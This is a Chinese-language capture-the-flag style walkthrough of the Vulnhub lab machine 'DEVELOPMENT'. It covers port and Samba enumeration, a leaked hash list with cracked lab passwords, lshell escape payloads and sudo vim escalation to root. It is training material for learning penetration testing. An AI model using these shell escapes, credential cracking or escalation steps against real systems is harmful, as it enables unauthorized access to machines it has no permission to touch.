[Vulnhub靶机：DIGITALWORLD.LOCAL_ DEVELOPMENT（vulnhub靶机入门级） | 半码博客 (bmabk.com)](https://www.bmabk.com/index.php/post/134194.html)

[(162条消息) vulnhub - digitalworld.local: DEVELOPMENT （考点：信息搜集/slogin_lib.inc.php / lshell / ubantu&vim提权）_冬萍子的博客-CSDN博客](https://blog.csdn.net/weixin_45527786/article/details/105757383)

# 信息搜集

1、端口探测

```bash
└─# nmap -sVC -p- -A -O 192.168.2.6 -oA nmap.txt
```

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  2048 79072b2c2c4e140ae7b36346c6b3ad16 (RSA)
113/tcp  open  ident?
|_auth-owners: oident
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_auth-owners: root
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
|_auth-owners: root
8080/tcp open  http-proxy  IIS 6.0
|_http-server-header: IIS 6.0
|_http-title: DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 06 Jul 2023 06:47:00 GMT
|     Server: IIS 6.0
|     Last-Modified: Wed, 26 Dec 2018 01:55:41 GMT
|     ETag: "230-57de32091ad69"
|     Accept-Ranges: bytes
|     Content-Length: 560
|     Vary: Accept-Encoding
|     Connection: close
|     Content-Type: text/html
|     <html>
|     <head><title>DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!</title>
|     </head>
|     <body>
|     <p>Welcome to the Development Page.</p>
|     <br/>
|     <p>There are many projects in this box. View some of these projects at html_pages.</p>
|     <br/>
|     <p>WARNING! We are experimenting a host-based intrusion detection system. Report all false positives to patrick@goodtech.com.sg.</p>
|     <br/>
|     <br/>
|     <br/>
|     <hr>
|     <i>Powered by IIS 6.0</i>
|     </body>
|     <!-- Searching for development secret page... where could it be? -->
|     <!-- Patrick, Head of Development-->
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 06 Jul 2023 06:47:00 GMT
|     Server: IIS 6.0
|     Allow: OPTIONS,HEAD,GET,POST
|     Content-Length: 0
|     Connection: close
|     Content-Type: text/html
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Thu, 06 Jul 2023 06:47:00 GMT
|     Server: IIS 6.0
|     Content-Length: 290
|     Connection: close
|     Content-Type: text/html; charset=iso-8859-1
|     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|     <html><head>
|     <title>400 Bad Request</title>
|     </head><body>
|     <h1>Bad Request</h1>
|     <p>Your browser sent a request that this server could not understand.<br />
|     </p>
|     <hr>
|     <address>IIS 6.0 Server at 192.168.2.6 Port 8080</address>
|_    </body></html>
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=7/6%Time=64A66364%P=x86_64-pc-linux-gnu%r(Get
SF:Request,330,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2006\x20Jul\x2020
SF:23\x2006:47:00\x20GMT\r\nServer:\x20IIS\x206\.0\r\nLast-Modified:\x20We
SF:d,\x2026\x20Dec\x202018\x2001:55:41\x20GMT\r\nETag:\x20\"230-57de32091a
SF:d69\"\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20560\r\nVary:\x20
SF:Accept-Encoding\r\nConnection:\x20close\r\nContent-Type:\x20text/html\r
SF:\n\r\n<html>\r\n<head><title>DEVELOPMENT\x20PORTAL\.\x20NOT\x20FOR\x20O
SF:UTSIDERS\x20OR\x20HACKERS!</title>\r\n</head>\r\n<body>\r\n<p>Welcome\x
SF:20to\x20the\x20Development\x20Page\.</p>\r\n<br/>\r\n<p>There\x20are\x2
SF:0many\x20projects\x20in\x20this\x20box\.\x20View\x20some\x20of\x20these
SF:\x20projects\x20at\x20html_pages\.</p>\r\n<br/>\r\n<p>WARNING!\x20We\x2
SF:0are\x20experimenting\x20a\x20host-based\x20intrusion\x20detection\x20s
SF:ystem\.\x20Report\x20all\x20false\x20positives\x20to\x20patrick@goodtec
SF:h\.com\.sg\.</p>\r\n<br/>\r\n<br/>\r\n<br/>\r\n<hr>\r\n<i>Powered\x20by
SF:\x20IIS\x206\.0</i>\r\n</body>\r\n\r\n<!--\x20Searching\x20for\x20devel
SF:opment\x20secret\x20page\.\.\.\x20where\x20could\x20it\x20be\?\x20-->\r
SF:\n\r\n<!--\x20Patrick,\x20Head\x20of\x20Development-->\r\n\r\n</html>\r
SF:\n")%r(HTTPOptions,A6,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2006\x2
SF:0Jul\x202023\x2006:47:00\x20GMT\r\nServer:\x20IIS\x206\.0\r\nAllow:\x20
SF:OPTIONS,HEAD,GET,POST\r\nContent-Length:\x200\r\nConnection:\x20close\r
SF:\nContent-Type:\x20text/html\r\n\r\n")%r(RTSPRequest,1C9,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nDate:\x20Thu,\x2006\x20Jul\x202023\x2006:47:00
SF:\x20GMT\r\nServer:\x20IIS\x206\.0\r\nContent-Length:\x20290\r\nConnecti
SF:on:\x20close\r\nContent-Type:\x20text/html;\x20charset=iso-8859-1\r\n\r
SF:\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//IETF//DTD\x20HTML\x202\.0//EN\">\
SF:n<html><head>\n<title>400\x20Bad\x20Request</title>\n</head><body>\n<h1
SF:>Bad\x20Request</h1>\n<p>Your\x20browser\x20sent\x20a\x20request\x20tha
SF:t\x20this\x20server\x20could\x20not\x20understand\.<br\x20/>\n</p>\n<hr
SF:>\n<address>IIS\x206\.0\x20Server\x20at\x20192\.168\.2\.6\x20Port\x2080
SF:80</address>\n</body></html>\n");
MAC Address: 00:0C:29:32:8F:D1 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: DEVELOPMENT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-07-06T06:48:32
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: development
|   NetBIOS computer name: DEVELOPMENT\x00
|   Domain name: \x00
|   FQDN: development
|_  System time: 2023-07-06T06:48:32+00:00
|_nbstat: NetBIOS name: DEVELOPMENT, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

2、查看端口发现 Samba 服务，用 `enum4linux`

```bash
└─# enum4linux 192.168.2.6
```

探测到一些用户名，把它们整理到 用户名 字典

```bash
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\admin (Local User)
S-1-22-1-1001 Unix User\patrick (Local User)
S-1-22-1-1002 Unix User\intern (Local User)
S-1-22-1-1003 Unix User\ossec (Local User)
S-1-22-1-1004 Unix User\ossecm (Local User)
S-1-22-1-1005 Unix User\ossecr (Local User)
```

此时还可以用 smbclient 尝试探测

# web打点

1、观察 8080 端口

<img src=".\图片\Snipaste_2023-07-06_14-54-55.png" alt="Snipaste_2023-07-06_14-54-55" style="zoom:80%;" />

由提示可知，这套系统可能配备了 waf ，而且 `html_pages` 可能是一个web路径

2、找到了一些web目录

<img src=".\图片\Snipaste_2023-07-06_14-56-19.png" alt="Snipaste_2023-07-06_14-56-19" style="zoom:80%;" />

有个小技巧，此时可以把这里的目录整理（用 grep、 awk 与管道符整理）到一个 url.list 字典文件中，用 curl 命令 批量访问，替升效率

```bash
for i in `cat url.list`;do curl $i;done
```

3、查看源码发现隐藏的关键页面

<img src=".\图片\Snipaste_2023-07-06_15-02-42.png" alt="Snipaste_2023-07-06_15-02-42" style="zoom:80%;" />

```http
http://192.168.2.6:8080/developmentsecretpage/
```

<img src=".\图片\Snipaste_2023-07-06_15-03-43.png" alt="Snipaste_2023-07-06_15-03-43" style="zoom:80%;" />

4、在关键页面随便点点，操作一下

<img src=".\图片\Snipaste_2023-07-06_15-04-53.png" alt="Snipaste_2023-07-06_15-04-53" style="zoom:80%;" />

发现关键报错信息，`slogin_lib.inc.php`

5、全网搜索 关键词 `slogin_lib.inc.php`

<img src=".\图片\Snipaste_2023-07-06_15-07-13.png" alt="Snipaste_2023-07-06_15-07-13" style="zoom:80%;" />

6、盲测尝试找到了一些用户名与密码

<img src=".\图片\Snipaste_2023-07-06_15-08-16.png" alt="Snipaste_2023-07-06_15-08-16" style="zoom:80%;" />

```
admin, 3cb1d13bb83ffff2defe8d1443d3a0eb
intern, 4a8a2b374f463b7aedbb44a066363b81
patrick, 87e6d56ce79af90dbe07d387d3d0579e
qiu, ee64497098d0926d198f54f6d5431f98
```

MD5解密如下

```
intern, 12345678900987654321
patrick, P@ssw0rd25
qiu, qiu
```

# 权限提升

## SSH登录

```bash
└─# ssh intern@192.168.2.6

*** System restart required ***
Last login: Thu Aug 23 15:57:48 2018 from 192.168.254.228
Congratulations! You tried harder!
Welcome to Development!
Type '?' or 'help' to get the list of allowed commands
intern:~$ help
cd  clear  echo  exit  help  ll  lpath  ls
intern:~$ echo $SHELL
/usr/local/bin/lshell
```

发现当前 shell 为 `lshell` ，是个受限制的 shell

## 绕过lshell

全网找方法 [Lshell - aldeid](https://www.aldeid.com/wiki/Lshell)

以下方法绕过

```
echo os.system('/bin/bash')
echo && 'bash'
```

在这里我的测试机的 ip 配靶机 封了，不知道自己触发了什么，啊？

## 切换到patrick用户

su 命令切换用户

```bash
intern@development:~$ id
uid=1002(intern) gid=1006(intern) groups=1006(intern)
intern@development:~$ su patrick
Password: 
patrick@development:/home/intern$ cd
patrick@development:~$ sudo -l
Matching Defaults entries for patrick on development:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User patrick may run the following commands on development:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /bin/nano
```

## 提权到root

上一步看到 patrick 用户能 sudo 运行 vim，那就 sudo vim 提权

```bash
patrick@development:~$ sudo vim 1
```

<img src=".\图片\Snipaste_2023-07-06_15-26-31.png" alt="Snipaste_2023-07-06_15-26-31" style="zoom:80%;" />

```bash
root@development:/root# cat proof.txt 
Congratulations on rooting DEVELOPMENT! :)
```

# 总结

在 web 打点中，也许根据关键函数的报错提示，也可以探测出一些信息

绕过受限制的 lshell

在web探测中，获取的web的上下文路径太多时，可以把路径拼接成一个 url 字典，可以用 curl 命令批量访问

sudo vim 提权

在得到一些权限后，如果无法直接纵向提权到 root ，也可以尝试横向提权到其它用户，看看能发现什么信息

在web探测时，要留心一些摆在眼前的重要信息与重要提示，站在人的角度去思考，别错过了





